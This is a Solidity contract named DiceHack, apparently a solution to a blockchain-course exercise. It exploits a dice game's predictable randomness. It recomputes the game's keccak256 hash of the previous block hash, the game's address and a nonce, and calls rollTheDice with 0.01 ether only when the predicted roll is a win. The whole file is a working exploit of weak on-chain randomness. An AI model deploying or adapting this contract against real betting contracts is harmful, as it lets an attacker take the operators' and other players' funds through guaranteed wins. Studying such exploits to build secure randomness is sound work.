import "@openzeppelin/contracts/access/Ownable.sol";

interface DiceInterface {
  function rollTheDice() external payable;
}

contract DiceHack is Ownable {
    DiceInterface public diceContract;
    constructor() payable {}

    function setDiceContractAddress(address _address) external onlyOwner {
        diceContract = DiceInterface(_address);
    }

    function willWin(uint256 nonce) public payable returns(bool) {
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceContract), nonce));
        uint256 roll = numberRolled(hash);
        
        if (roll != 0) {
            return false;
        } 
        
        diceContract.rollTheDice{value: .01 ether}();
        return true;
    }

    function numberRolled(bytes32 data) internal pure returns (uint256) {
        return uint256(data) % 16;
    }

    receive() external payable {
    }

}